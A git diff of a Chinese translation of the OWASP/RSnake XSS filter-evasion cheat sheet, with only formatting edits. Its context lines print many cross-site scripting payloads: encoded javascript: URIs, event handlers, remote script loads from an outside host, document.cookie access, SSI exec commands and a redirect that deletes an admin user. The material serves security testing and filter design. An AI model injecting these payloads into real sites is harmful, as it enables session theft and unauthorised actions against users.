@@ -6,7 +6,7 @@ tags:
 
 ## 前言
 
-* * *
+
 
 译者注： 翻译本文的最初原因是当我自己看到这篇文章后，觉得它是非常有价值。但是这么著名的一个备忘录却一直没有人把它翻译成中文版。很多人仅仅是简单的把文中的各种代码复制下来，然后看起来很刁的发在各种论坛上，不过你要真去认真研读这些代码，就会完全不知所云了。原因是这篇文章最精华的部分是代码的解释而非代码本身。
 
@@ -28,7 +28,7 @@ tags:
 
 这篇文章的主要目的是去给应用安全测试者提供一份xss漏洞检测指南。文章的初始内容由RSnake提供给OWASP，从他的xss备忘录: http://ha.ckers.org/xss.html 。目前这个网页已经重定向到我们这里，我们打算维护和完善它。OWASP的第一个防御备忘录项目：the XSS (Cross Site Scripting) Prevention Cheat Sheet灵感来源于RSnake的 XSS Cheat Sheet，所以我们对他给予我们的启发表示感谢。我们想要去创建短小简单的参考给开发者去帮助他们预防xss漏洞，而不是创建一个复杂的备忘录去简单的告诉他们需要去预防各种千奇百怪的攻击。所以，OWASP备忘录系列诞生了。
 
-* * *
+
 
 ## 测试
 
@@ -36,7 +36,7 @@ tags:
 
 请注意大部分的xss攻击向量已经在其代码下方给出了测试过的浏览器列表。
 
-* * *
+
 
 ### xss 探测器
 
@@ -48,7 +48,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 ```
 
-* * *
+
 
 ### xss 探测器2
 
@@ -58,7 +58,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 '';!--"<XSS>=&{()}
 ```
 
-* * *
+
 
 ### 无过滤绕过
 
@@ -68,9 +68,9 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 ```
 
-* * *
 
-* * *
+
+
 
 ### 通过javascript指令实现的图片xss
 
@@ -80,7 +80,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <IMG SRC="javascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### 无引号无分号
 
@@ -88,7 +88,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <IMG SRC=javascript:alert('XSS')>
 ```
 
-* * *
+
 
 ### 不区分大小写的xss攻击向量
 
@@ -96,7 +96,7 @@ alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 ```
 
-* * *
+
 
 ### html 实体
 
@@ -106,7 +106,7 @@ The semicolons are required for this to work:
 <IMG SRC=javascript:alert("XSS")>
 ```
 
-* * *
+
 
 ### 重音符混淆
 
@@ -116,7 +116,7 @@ The semicolons are required for this to work:
 <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
 ```
 
-* * *
+
 
 ### 畸形的A标签
 
@@ -132,7 +132,7 @@ The semicolons are required for this to work:
 <a onmouseover=alert(document.cookie)>xxs link</a>
 ```
 
-* * *
+
 
 ### 畸形的IMG标签
 
@@ -142,7 +142,7 @@ The semicolons are required for this to work:
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 ```
 
-* * *
+
 
 ### fromCharCode
 
@@ -152,7 +152,7 @@ The semicolons are required for this to work:
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 ```
 
-* * *
+
 
 ### 默认SRC属性去绕过SRC域名检测过滤器
 
@@ -162,7 +162,7 @@ The semicolons are required for this to work:
 <IMG SRC=# onmouseover="alert('xxs')">
 ```
 
-* * *
+
 
 ### 默认SRC属性通过省略它的值
 
@@ -170,7 +170,7 @@ The semicolons are required for this to work:
 <IMG SRC= onmouseover="alert('xxs')">
 ```
 
-* * *
+
 
 ### 默认SRC属性通过完全不设置它
 
@@ -178,7 +178,7 @@ The semicolons are required for this to work:
 <IMG onmouseover="alert('xxs')">
 ```
 
-* * *
+
 
 ### 通过error事件触发alert
 
@@ -186,7 +186,7 @@ The semicolons are required for this to work:
 <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
 ```
 
-* * *
+
 
 ### 十进制html编码引用
 
@@ -197,7 +197,7 @@ The semicolons are required for this to work:
 &#39;&#88;&#83;&#83;&#39;&#41;>
 ```
 
-* * *
+
 
 ### 结尾没有分号的十进制html编码引用
 
@@ -207,7 +207,7 @@ The semicolons are required for this to work:
 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 ```
 
-* * *
+
 
 ### 结尾没有分号的十六进制html编码引用
 
@@ -217,7 +217,7 @@ The semicolons are required for this to work:
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
 ```
 
-* * *
+
 
 ### 内嵌TAB
 
@@ -227,7 +227,7 @@ The semicolons are required for this to work:
 <IMG SRC="jav   ascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### 内嵌被编码的TAB
 
@@ -237,7 +237,7 @@ The semicolons are required for this to work:
 <IMG SRC="jav&#x09;ascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### 内嵌换行符去分开xss代码
 
@@ -247,7 +247,7 @@ The semicolons are required for this to work:
 <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### 编码回车符去分开xss代码
 
@@ -257,7 +257,7 @@ The semicolons are required for this to work:
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### 没有分割的javascript指令
 
@@ -267,7 +267,7 @@ null字符也可以作为一个xss向量，但是不像上边那样。你需要�
 perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 ```
 
-* * *
+
 
 ### 图片元素中javascript之前的空格和元字符为xss
 
@@ -277,7 +277,7 @@ xss过滤拼配模式没有考虑单词"javascript:"中可能存在空格是正�
 <IMG SRC=" &#14;  javascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### 非字母数字字符xss
 
@@ -299,7 +299,7 @@ Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是他们�
 <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 ```
 
-* * *
+
 
 ### 附加的开括号
 
@@ -309,7 +309,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <<SCRIPT>alert("XSS");//<</SCRIPT>
 ```
 
-* * *
+
 
 ### 没关闭的script标签
 
@@ -319,7 +319,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
 ```
 
-* * *
+
 
 ### script标签中的协议解析
 
@@ -329,7 +329,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <SCRIPT SRC=//ha.ckers.org/.j>
 ```
 
-* * *
+
 
 ### 半开的HTML/JavaScript xss向量
 
@@ -339,7 +339,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <IMG SRC="javascript:alert('XSS')"
 ```
 
-* * *
+
 
 ### 双开尖括号
 
@@ -349,7 +349,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <iframe src=http://ha.ckers.org/scriptlet.html <
 ```
 
-* * *
+
 
 ### 转义javascript中的转义
 
@@ -359,7 +359,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 \";alert('XSS');//
 ```
 
-* * *
+
 
 ### 闭合title标签
 
@@ -369,7 +369,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
 ```
 
-* * *
+
 
 ### INPUT image
 
@@ -377,7 +377,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### BODY image
 
@@ -385,7 +385,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <BODY BACKGROUND="javascript:alert('XSS')">
 ```
 
-* * *
+
 
 ### IMG DYNSRC(视频剪辑)
 
@@ -393,7 +393,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <IMG DYNSRC="javascript:alert('XSS')">
 ```
 
-* * *
+
 
 ### IMG lowsrc（低分辨率图片）
 
@@ -401,7 +401,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <IMG LOWSRC="javascript:alert('XSS')">
 ```
 
-* * *
+
 
 ### List-style-image
 
@@ -409,7 +409,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
 ```
 
-* * *
+
 
 ### List-style-image
 
@@ -419,7 +419,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
 ```
 
-* * *
+
 
 ### VBscript in an image
 
@@ -427,7 +427,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <IMG SRC='vbscript:msgbox("XSS")'>
 ```
 
-* * *
+
 
 ### Livescript (仅适用于老版本的Netscape)
 
@@ -435,7 +435,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <IMG SRC="livescript:[code][/code]">
 ```
 
-* * *
+
 
 ### BODY 标签
 
@@ -445,7 +445,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <BODY ONLOAD=alert('XSS')>
 ```
 
-* * *
+
 
 ### 事件处理程序
 
@@ -558,7 +558,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
  105\. seekSegmentTime() (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)
 ```
 
-* * *
+
 
 ### BGSOUND(背景音乐)
 
@@ -566,7 +566,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <BGSOUND SRC="javascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### & JavaScript 包含
 
@@ -574,7 +574,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <BR SIZE="&{alert('XSS')}">
 ```
 
-* * *
+
 
 ### 样式表
 
@@ -582,7 +582,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <LINK REL="stylesheet" HREF="javascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### 远程样式表
 
@@ -592,7 +592,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
 ```
 
-* * *
+
 
 ### 远程样式表2
 
@@ -602,7 +602,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
 ```
 
-* * *
+
 
 ### 远程样式表3
 
@@ -612,7 +612,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
 ```
 
-* * *
+
 
 ### 远程样式表4
 
@@ -622,7 +622,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
 ```
 
-* * *
+
 
 ### 分隔javascript在STYLE标签
 
@@ -632,7 +632,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
 ```
 
-* * *
+
 
 ### STYLE属性中使用注释去分隔表达式
 
@@ -642,7 +642,7 @@ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，�
 <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
 ```
 
-* * *
+
 
 ### IMG样式的表达式
 
@@ -653,7 +653,7 @@ exp/*<A STYLE='no\xss:noxss("*//*");
 xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 ```
 
-* * *
+
 
 ### STYLE标签（仅支持老版本的Netscape）
 
@@ -661,7 +661,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 <STYLE TYPE="text/javascript">alert('XSS');</STYLE>
 ```
 
-* * *
+
 
 ### 使用background-image的style标签
 
@@ -669,7 +669,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 <STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
 ```
 
-* * *
+
 
 ### 使用background的style标签
 
@@ -677,7 +677,7 @@ xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
 <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
 ```
 
-* * *
+
 
 ### 匿名html标签的属性
 
@@ -687,7 +687,7 @@ IE6.0 和使用了ix渲染引擎的Netscape 8.1+ 并不会关心你建立的html
 <XSS STYLE="xss:expression(alert('XSS'))">
 ```
 
-* * *
+
 
 ### 本地 htc 文件
 
@@ -697,7 +697,7 @@ IE6.0 和使用了ix渲染引擎的Netscape 8.1+ 并不会关心你建立的html
 <XSS STYLE="behavior: url(xss.htc);">
 ```
 
-* * *
+
 
 ### US-ASCII编码
 
@@ -707,7 +707,7 @@ US-ASCII 编码 (发现被 Kurt Huwig)。它是使用畸形的ASCII 编码用7bi
 ¼script¾alert(¢XSS¢)¼/script¾
 ```
 
-* * *
+
 
 ### META
 
@@ -717,7 +717,7 @@ US-ASCII 编码 (发现被 Kurt Huwig)。它是使用畸形的ASCII 编码用7bi
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### META using data
 
@@ -727,7 +727,7 @@ URL指令方案，它是非常的不错因为赢没有明显的SCRIPT单词或�
 <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
 ```
 
-* * *
+
 
 ### 额外url参数的META
 
@@ -737,7 +737,7 @@ URL指令方案，它是非常的不错因为赢没有明显的SCRIPT单词或�
 <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
 ```
 
-* * *
+
 
 ### IFRAME
 
@@ -747,7 +747,7 @@ URL指令方案，它是非常的不错因为赢没有明显的SCRIPT单词或�
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 ```
 
-* * *
+
 
 ### IFRAME 基于事件
 
@@ -757,7 +757,7 @@ IFrames或其他元素可以使用事件如下（提出被 David Cross）
 <IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
 ```
 
-* * *
+
 
 ### FRAME
 
@@ -767,7 +767,7 @@ Frames有一些列相同的问题像 iframes
 <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
 ```
 
-* * *
+
 
 ### TABLE
 
@@ -775,7 +775,7 @@ Frames有一些列相同的问题像 iframes
 <TABLE BACKGROUND="javascript:alert('XSS')">
 ```
 
-* * *
+
 
 ### TD
 
@@ -785,7 +785,7 @@ Frames有一些列相同的问题像 iframes
 <TABLE><TD BACKGROUND="javascript:alert('XSS')">
 ```
 
-* * *
+
 
 ### DIV background-image
 
@@ -793,7 +793,7 @@ Frames有一些列相同的问题像 iframes
 <DIV STYLE="background-image: url(javascript:alert('XSS'))">
 ```
 
-* * *
+
 
 ### 使用 unicoded编码xss利用代码的DIV background-image
 
@@ -803,7 +803,7 @@ Frames有一些列相同的问题像 iframes
 <DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
 ```
 
-* * *
+
 
 ### 附加额外字符的DIV background-image
 
@@ -813,7 +813,7 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
 <DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
 ```
 
-* * *
+
 
 ### DIV expression
 
@@ -823,7 +823,7 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
 <DIV STYLE="width: expression(alert('XSS'));">
 ```
 
-* * *
+
 
 ### html条件选择注释块
 
@@ -835,7 +835,7 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
  <![endif]-->
 ```
 
-* * *
+
 
 ### BASE标签
 
@@ -845,7 +845,7 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
 <BASE HREF="javascript:alert('XSS');//">
 ```
 
-* * *
+
 
 ### OBJECT标签
 
@@ -855,7 +855,7 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
 ```
 
-* * *
+
 
 ### 使用一个你可以载入包含有xss代码的flash文件的 EMBED 标签
 
@@ -865,7 +865,7 @@ Rnaske开发了一个XSS fuzzer去探测可以在开括号和javascript之间加
 <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
 ```
 
-* * *
+
 
 ### 使用在flash中的ActionScript可以混淆你的xss向量
 
@@ -877,7 +877,7 @@ d="alert('XSS');\")";
 eval(a+b+c+d);
 ```
 
-* * *
+
 
 ### CDATA混淆的 XML数据岛
 
@@ -888,13 +888,13 @@ eval(a+b+c+d);
 <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 ```
 
-* * *
+
 
 ### 使用XML数据岛生成含有javascript代码的当前域xml文件
 
 它是相同的同上面仅仅代替XML文件为当前域文件。你可以看到结果在下面。<span datasrc="#I" datafld="C" dataformatas="HTML"></span>
 
-* * *
+
 
 ### HTML+TIME 在XML中
 
@@ -908,7 +908,7 @@ eval(a+b+c+d);
 </BODY></HTML>
 ```
 
-* * *
+
 
 ### 简单的修改字符去绕过过滤器对 ".js"的过滤
 
@@ -918,7 +918,7 @@ eval(a+b+c+d);
 <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
 ```
 
-* * *
+
 
 ### SSI (服务器端包含)
 
@@ -928,7 +928,7 @@ eval(a+b+c+d);
 <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
 ```
 
-* * *
+
 
 ### PHP
 
@@ -939,7 +939,7 @@ eval(a+b+c+d);
 echo('IPT>alert("XSS")</SCRIPT>'); ?>
 ```
 
-* * *
+
 
 ### 嵌入命令的IMG
 
@@ -949,7 +949,7 @@ echo('IPT>alert("XSS")</SCRIPT>'); ?>
 <IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
 ```
 
-* * *
+
 
 ### 嵌入命令的IMG II
 
@@ -959,7 +959,7 @@ echo('IPT>alert("XSS")</SCRIPT>'); ?>
 Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 ```
 
-* * *
+
 
 ### Cookie篡改
 
@@ -969,7 +969,7 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 <META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 ```
 
-* * *
+
 
 ### UTF-7编码
 
@@ -979,35 +979,35 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
 ```
 
-* * *
+
 
 ### 使用HTML 引用封装的xss
 
-他是被测试在ie，具体因情况而异。它是为了绕过那些可以输入 "<SCRIPT>" 但不允许输入 "<SCRIPT SRC..."，通过正则"/<script[^>]+src/i"进行过滤的xss过滤区。
+他是被测试在ie，具体因情况而异。它是为了绕过那些可以输入 `<SCRIPT>` 但不允许输入 `<SCRIPT SRC...`，通过正则`/<script[^>]+src/i`进行过滤的xss过滤区。
 
 ```
 <SCRIPT a=">" SRC="http://ha.ckers.org/xss.js">
 ```
 
-为了执行xss代码在那些允许输入"<SCRIPT>" 但不允许 "<script src..."靠正则拼配"/<script((\s+\w+(\s_=\s_(?:"(.)_?"|'(.)_?'|[^'">\s]+))?)+\s_|\s_)src/i" （这个是重要的，因为我已经看到这个正则在实际环境中。）
+为了执行xss代码在那些允许输入`<SCRIPT>` 但不允许 `<script src...`靠正则拼配`/<script((\s+\w+(\s_=\s_(?:"(.)_?"|'(.)_?'|[^'">\s]+))?)+\s_|\s_)src/i` （这个是重要的，因为我已经看到这个正则在实际环境中。）
 
 ```
 <SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 ```
 
-另一个逃避相同正则 "/<script((\s+\w+(\s_=\s_(?:"(.)_?"|'(.)_?'|[^'">\s]+))?)+\s_|\s_)src/i"的xss代码
+另一个逃避相同正则 `/<script((\s+\w+(\s_=\s_(?:"(.)_?"|'(.)_?'|[^'">\s]+))?)+\s_|\s_)src/i`的xss代码
 
 ```
 <SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 ```
 
-这是另一个xss例子去绕过相同的过滤器，关于"/<script((\s+\w+(\s_=\s_(?:"(.)_?"|'(.)_?'|[^'">\s]+))?)+\s_|\s_)src/i"的正则过滤。我知道，我说过我将不会去痛痛快快的聊减灾技术。但是这是我所看到的唯一例子在允许用户输入<SCRIPT>但是不允许通过src加在远程脚本的过滤这个xss的可用方法。（当然，还有一些其他方法去处理它，如果它们允许<SCRIPT> ）
+这是另一个xss例子去绕过相同的过滤器，关于`/<script((\s+\w+(\s_=\s_(?:"(.)_?"|'(.)_?'|[^'">\s]+))?)+\s_|\s_)src/i`的正则过滤。我知道，我说过我将不会去痛痛快快的聊减灾技术。但是这是我所看到的唯一例子在允许用户输入`<SCRIPT>`但是不允许通过src加在远程脚本的过滤这个xss的可用方法。（当然，还有一些其他方法去处理它，如果它们允许`<SCRIPT>` ）
 
 ```
 <SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
 ```
 
-最后一个绕过"/<script((\s+\w+(\s_=\s_(?:"(.)_?"|'(.)_?'|[^'">\s]+))?)+\s_|\s_)src/i"正则匹配的例子，通过重音符。（再以无法工作在firfox）
+最后一个绕过`/<script((\s+\w+(\s_=\s_(?:"(.)_?"|'(.)_?'|[^'">\s]+))?)+\s_|\s_)src/i`正则匹配的例子，通过重音符。（再以无法工作在firfox）
 
 ```
 <SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
@@ -1066,7 +1066,7 @@ Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
 tt  p://6   6.000146.0x7.147/">XSS</A>
 ```
 
-**协议绕过** “//”代替“http:// ” 可以节省更多字符。这是非常有用的当输入空间是有限的时候。两个字符可能解决大问题。也是容易绕过像"(ht|f)tp(s)?://" 这样的正则过滤。（感谢 Ozh 提出这部分）。你也可以改变//" 为 "\"。你需要保持斜杠在适当的地方。否则可能会被当作一个相对路径的url。
+**协议绕过** “//”代替“http:// ” 可以节省更多字符。这是非常有用的当输入空间是有限的时候。两个字符可能解决大问题。也是容易绕过像"(ht|f)tp(s)?://" 这样的正则过滤。（感谢 Ozh 提出这部分）。你也可以改变//" 为 "\\"。你需要保持斜杠在适当的地方。否则可能会被当作一个相对路径的url。
 
 ```
 <A HREF="//www.google.com/">XSS</A>
@@ -1114,7 +1114,7 @@ tt  p://6   6.000146.0x7.147/">XSS</A>
 <A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
 ```
 
-* * *
+
 
 ### 字符编码表
 
@@ -1193,19 +1193,19 @@ tt  p://6   6.000146.0x7.147/">XSS</A>
 \u003C
 ```
 
-* * *
+
 
 ### 字符编码和ip混淆器
 
 下面地址中包含了在xss有用的各种基本转换器。 http://ha.ckers.org/xsscalc.html
 
-* * *
+
 
 ### 作者和主编
 
 Robert "RSnake" Hansen
 
-* * *
+
 
 ### 翻译
 
